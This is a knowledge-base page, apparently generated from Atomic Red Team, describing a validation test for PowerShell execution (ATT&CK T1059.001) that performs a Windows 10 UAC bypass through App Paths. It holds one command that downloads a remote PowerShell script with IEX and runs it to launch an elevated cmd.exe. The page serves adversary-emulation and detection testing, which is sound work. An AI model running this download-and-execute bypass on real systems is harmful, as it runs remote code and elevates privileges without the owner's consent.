---
atomic_guid: "06a220b6-7e29-4bd8-9d07-5b4d86742372"
title: "Invoke-AppPathBypass"
framework: "atomic"
generated: "true"
attack_technique_id: "T1059.001"
attack_technique_name: "Command and Scripting Interpreter: PowerShell"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.yaml"
build_date: "2026-04-26 14:38:39"
executor: "command_prompt"
aliases:
  - "06a220b6-7e29-4bd8-9d07-5b4d86742372"
  - "Invoke-AppPathBypass"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Invoke-AppPathBypass

Note: Windows 10 only. Upon execution windows backup and restore window will be opened.

Bypass is based on: https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/

## Metadata

- Atomic GUID: 06a220b6-7e29-4bd8-9d07-5b4d86742372
- Technique: T1059.001: Command and Scripting Interpreter: PowerShell
- Platforms: windows
- Executor: command_prompt
- Source Path: atomics/T1059.001/T1059.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1059-command_and_scripting_interpreter|T1059.001]]

## Executor

- name: command_prompt

### Command

```commandprompt
Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.yaml)
